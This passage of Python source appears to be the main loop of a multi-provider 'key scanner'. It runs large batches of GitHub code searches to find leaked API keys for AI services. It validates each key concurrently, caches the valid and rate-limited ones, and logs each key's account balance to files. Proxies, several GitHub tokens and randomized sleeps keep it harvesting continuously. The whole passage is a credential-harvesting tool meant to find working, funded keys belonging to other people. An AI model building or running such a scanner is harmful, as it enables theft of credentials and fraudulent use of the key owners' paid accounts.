    balance_file = os.path.join(balance_dir, f"{prefix}_{date_str}.txt")



    try:

        with open(balance_file, "a", encoding="utf-8") as f:

            for item in keys_with_balance:

                key = item["key"]

                balance = item.get("balance", {})

                if balance and "error" not in balance:

                    balances = balance.get("balances", [])

                    parts = []

                    total_val = 0.0

                    for b in balances:

                        cur = b.get("currency", "?")

                        total = b.get("total_balance", 0)

                        granted = b.get("granted_balance", 0)

                        topped = b.get("topped_up_balance", 0)

                        parts.append(f"{cur}{total:.2f}(grant{granted:.2f}+topup{topped:.2f})")

                        total_val += total

                    balance_str = "|".join(parts)

                    f.write(f"{key} | {balance_str} | total={total_val:.2f}\n")

                else:

                    error_msg = balance.get("error", "unknown") if balance else "no_data"

                    f.write(f"{key} | BALANCE_ERROR: {error_msg}\n")

        logger.info(f"[{PROVIDERS.get(provider, {}).get('name', provider)}] Saved balance for {len(keys_with_balance)} key(s)")

    except Exception as e:

        logger.error(f"Save balance failed: {e}")





def print_skip_stats():

    total = sum(skip_stats.values())

    if total > 0:

        logger.info(f"Skipped {total} items - Time:{skip_stats['time_filter']} "

                     f"Dup:{skip_stats['sha_duplicate']} Age:{skip_stats['age_filter']} "

                     f"Docs:{skip_stats['doc_filter']} Cache:{skip_stats['key_cache_hit']}")





def reset_skip_stats():

    global skip_stats

    skip_stats = {"time_filter": 0, "sha_duplicate": 0, "age_filter": 0, "doc_filter": 0, "key_cache_hit": 0}





# ============ Main Loop ============



def main():

    start_time = datetime.now()



    logger.info("=" * 60)

    logger.info("HAJIMI KING V2 - OPTIMIZED MULTI-PROVIDER SCANNER")

    logger.info("=" * 60)

    logger.info(f"Started at: {start_time.strftime('%Y-%m-%d %H:%M:%S')}")



    # Load key cache from existing files

    key_cache.load_from_files(Config.DATA_PATH, PROVIDERS)

    logger.info(f"KeyCache: {len(key_cache.valid)} valid + {len(key_cache.rate_limited)} rate-limited known keys")



    # Show supported providers

    logger.info(f"Supported Providers: {len([p for p in PROVIDERS.values() if p['enabled']])}")

    for pid, config in PROVIDERS.items():

        status = "ON" if config["enabled"] else "OFF"

        balance = "+BAL" if config.get("has_balance_api") else ""

        logger.info(f"  [{status}] {config['name']} (prefix:{config['prefix']}) {balance}")



    if not Config.check():

        logger.error("Config check failed. Exiting...")

        sys.exit(1)

    if not file_manager.check():

        logger.error("FileManager check failed. Exiting...")

        sys.exit(1)



    if sync_utils.balancer_enabled:

        logger.info("SyncUtils ready for async key syncing")



    search_queries = file_manager.get_search_queries()

    logger.info(f"GitHub tokens: {len(Config.GITHUB_TOKENS)} | Queries: {len(search_queries)} | Date filter: {Config.DATE_RANGE_DAYS}d")

    if Config.PROXY_LIST:

        logger.info(f"Proxies: {len(Config.PROXY_LIST)}")



    if checkpoint.last_scan_time:

        logger.info(f"Checkpoint: last={checkpoint.last_scan_time} | SHAs={len(checkpoint.scanned_shas)} | queries={len(checkpoint.processed_queries)}")

    else:

        logger.info("No checkpoint - full scan mode")



    logger.info("=" * 60)



    total_keys_found = {pid: 0 for pid in PROVIDERS.keys()}

    loop_count = 0



    while True:

        try:

            loop_count += 1
            global _loop_count
            _loop_count = loop_count
            _scan_counts.clear()  # Reset per-loop scan counts
            # Cleanup old logs every 10 loops
            if loop_count % 10 == 0:
                file_manager.cleanup_old_logs()

            logger.info(f"--- Loop #{loop_count} --- {datetime.now().strftime('%H:%M:%S')}")



            query_count = 0

            loop_processed_files = 0

            reset_skip_stats()



            for i, q in enumerate(search_queries, 1):

                normalized_q = normalize_query(q)

                if normalized_q in checkpoint.processed_queries:

                    continue



                res = github_utils.search_for_keys(q)



                if res and "items" in res:

                    items = res["items"]

                    if items:

                        query_valid = {pid: 0 for pid in PROVIDERS.keys()}

                        results_lock = threading.Lock()

                        loop_processed_lock = threading.Lock()

                        # Build to-process list first (dedup + skip in single pass)

                        to_process = []

                        for item in items:

                            should_skip, skip_reason = should_skip_item(item, checkpoint)

                            if should_skip:

                                continue

                            to_process.append(item)

                        # Outer concurrency for file fetching + validation

                        with ThreadPoolExecutor(max_workers=Config.FILE_PROCESS_WORKERS) as file_executor:

                            future_to_item = {

                                file_executor.submit(process_item, item): item

                                for item in to_process

                            }

                            completed = 0

                            for future in as_completed(future_to_item):

                                item = future_to_item[future]

                                completed += 1

                                try:

                                    item_results = future.result()

                                except Exception:

                                    logger.error(f"process_item exception for {item.get('html_url', '?')}")

                                    item_results = {}

                                with results_lock:

                                    for provider, count in item_results.items():

                                        query_valid[provider] += count

                                        total_keys_found[provider] += count

                                    checkpoint.add_scanned_sha(item.get("sha"))

                                with loop_processed_lock:

                                    loop_processed_files += 1

                                # Save checkpoint every 50 items

                                if completed % 50 == 0:

                                    total_valid = sum(total_keys_found.values())

                                    logger.info(f"Progress: {completed}/{len(to_process)} | query: {q} | total valid: {total_valid}")

                                    file_manager.save_checkpoint(checkpoint)

                                    file_manager.update_dynamic_filenames()





                        total_valid = sum(query_valid.values())

                        if total_valid > 0:

                            logger.info(f"Query {i}/{len(search_queries)}: +{total_valid} valid keys")



                    print_skip_stats()



                checkpoint.add_processed_query(normalized_q)

                query_count += 1



                # Save checkpoint every 10 queries (was every query)

                if query_count % 10 == 0:

                    checkpoint.update_scan_time()

                    file_manager.save_checkpoint(checkpoint)

                    file_manager.update_dynamic_filenames()



                if query_count % 5 == 0:

                    time.sleep(random.uniform(Config.QUERY_SLEEP_MIN, Config.QUERY_SLEEP_MAX))



            total_valid = sum(total_keys_found.values())

            logger.info(f"Loop #{loop_count} done: {loop_processed_files} files | Total valid: {total_valid}")

            # Auto-cycle: reset processed_queries when all queries exhausted
            # FIX: search_queries 含重复项(8820)，processed_queries 存的是去重后的条目(8819)，
            # 直接 len(list) >= len(set) 永远为假 → 每轮全部 continue → 0 files / 0 keys 空转。
            # 用归一化去重后的集合长度作为分母。
            total_queries = len({normalize_query(q) for q in search_queries})
            if len(checkpoint.processed_queries) >= total_queries:
                logger.info(f"All {total_queries} queries processed, resetting for next cycle...")
                checkpoint.reset_processed_queries()
                checkpoint.update_scan_time()
                file_manager.save_checkpoint(checkpoint)

            for pid, count in total_keys_found.items():

                if count > 0:

                    logger.info(f"  {PROVIDERS[pid]['name']}: {count}")



            logger.info(f"Sleeping {Config.LOOP_SLEEP}s...")

            time.sleep(Config.LOOP_SLEEP)



        except KeyboardInterrupt:

            logger.info("Interrupted by user")

            checkpoint.update_scan_time()

            file_manager.save_checkpoint(checkpoint)

            total_valid = sum(total_keys_found.values())

            logger.info(f"Final: {total_valid} valid keys")

            for pid, count in total_keys_found.items():

                if count > 0:

                    logger.info(f"  {PROVIDERS[pid]['name']}: {count}")

            sync_utils.shutdown()

            break

        except Exception as e:

            logger.error(f"Unexpected error: {e}")

            traceback.print_exc()

            continue





if __name__ == "__main__":

    main()

